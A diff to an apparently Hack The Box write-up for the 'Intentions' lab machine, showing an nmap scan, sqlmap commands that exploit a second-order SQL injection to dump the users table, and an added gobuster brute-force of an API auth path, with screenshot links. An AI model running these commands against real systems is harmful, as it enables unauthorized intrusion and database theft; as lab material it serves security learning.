@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/de453151-e79c-4960-817b-7aa1ce25a82e)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.220
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)
@@ -44,3 +44,11 @@ sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=spa
 sqlmap -r req1b.txt --second-req=req2b.txt --batch --tamper=space2comment -T users --dump
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/0fa022ca-bc8b-4cfb-9d89-05da8947f30d)
+
+
+```
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404
+```
+![Uploading image.png…]()
+
+
